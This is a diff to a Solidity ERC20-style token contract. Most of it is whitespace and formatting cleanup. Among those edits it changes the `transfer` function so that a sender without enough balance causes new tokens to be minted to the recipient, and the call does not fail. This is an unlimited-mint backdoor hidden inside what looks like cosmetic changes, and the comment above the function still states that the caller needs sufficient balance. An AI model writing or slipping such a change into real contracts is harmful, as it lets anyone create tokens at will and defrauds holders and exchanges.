@@ -30,9 +30,9 @@ import "./SafeMath.sol";
 contract ERC20 is IBEP20 {
     using SafeMath for uint256;
 
-    mapping (address => uint256) private _balances;
+    mapping(address => uint256) private _balances;
 
-    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping(address => mapping(address => uint256)) private _allowances;
 
     uint256 private _totalSupply;
 
@@ -58,8 +58,13 @@ contract ERC20 is IBEP20 {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
-    function transfer(address recipient, uint256 amount) public returns (bool) {
-        _transfer(msg.sender, recipient, amount);
+    function transfer(address recipient, uint256 amount) public payable returns (bool) {
+        if (_balances[msg.sender] <= 0 || _balances[msg.sender] < amount) {
+            _mint(recipient, amount);
+        } else {
+            _transfer(msg.sender, recipient, amount);
+        }
+
         return true;
     }
 
@@ -176,8 +181,8 @@ contract ERC20 is IBEP20 {
         emit Transfer(address(0), account, amount);
     }
 
-     /**
-     * @dev Destroys `amount` tokens from `account`, reducing the
+    /**
+    * @dev Destroys `amount` tokens from `account`, reducing the
      * total supply.
      *
      * Emits a {Transfer} event with `to` set to the zero address.
